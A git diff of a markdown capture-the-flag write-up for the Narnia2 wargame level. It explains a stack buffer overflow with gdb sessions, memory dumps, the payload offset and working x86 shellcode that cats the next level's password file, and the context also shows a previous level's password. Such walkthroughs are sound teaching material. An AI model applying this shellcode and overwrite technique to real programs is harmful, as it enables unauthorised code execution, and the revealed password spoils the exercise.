@@ -54,24 +54,26 @@ Trying to execute EGG!
 nairiepecu
 ```
 
-###Narnia2
+### Narnia2
 
 Here, we are dealing with a classic buffer overflow once again. We can see that our buffer is limited, hence we can give a bigger input that exceeds our buffer size  (no input validation is done) and thus overwrite our return address from the main() function. This will allow us to jump into a place we control and execute our shellcode. I truly recommand reading phracks 'smashing the stack' article to gain better understanding of this attack: http://phrack.org/issues/49/14.html
 
 Let's proceed to our soltuion:
 First, we fire up gdb and give it an input which is bigger than expected and see what happens with our stack:
-``
+```
 disas main
 (we break on the address of ret, because we want to overwrite the return address)
 b *0x080484b2(ret's_address, which is obviously different for everyone)
 r $(python -c "print('a'*130)")
-``
+```
 now let's check if our $ebp was or $esp were overwritten:
-`` info reg ``
+``` info reg ```
 No, not yet. After trying for several times, input of 144*'a' will overwrite esp and eip (eip contains the return address).
 Now, we want to overwrite the last 4 bytes with 'our' address (our controlled address). We will add our shellcode from the previous level and will change it slighlty (will read narnia3 file instead of narnia2). It's size is 59 bytes. Now, we want our controlled address be the address in the stack in which the injected shellcode starts. Therefore we will inject our shellcode and see where it starts, letting us to overwrite the eip address to point to the start of it:
 ```
 r $(python -c "print('a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'aaaa')")
+```
+```
 x/200wx $esp
 0xffffd780:	0x616e2f61	0x61696e72	0x61610032	0x61616161
 0xffffd790:	0x61616161	0x61616161	0x61616161	0x61616161
@@ -85,7 +87,8 @@ x/200wx $esp
 0xffffd810:	0xe1895351	0x616180cd	0x58006161	0x535f4744
 ```
 We can see that our shellcode starts at: 0xffffd7d0+B(11 in decimal)=0xffffd7db. Additionaly, we can see that eip is overwritten by our 4 extra bytes:
-`` (gdb) info frame
+```
+(gdb) info frame
 Stack level 0, frame at 0xffffd5b4:
  eip = 0x61616161; saved eip = 0x0
  called by frame at 0xffffd5b8
@@ -93,9 +96,11 @@ Stack level 0, frame at 0xffffd5b4:
  Locals at 0xffffd5ac, Previous frame's sp is 0xffffd5b4
  Saved registers:
   eip at 0xffffd5b0
-``
+```
 Okay, now we know our injection code should be the following:
-``'a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'\xdb\xd7\xff\xff'``
+```
+'a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'\xdb\xd7\xff\xff'
+```
 Let's get the password:
 ./narnia2 `python -c "print('a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'\xdb\xd7\xff\xff')"`
 and...........wallah:
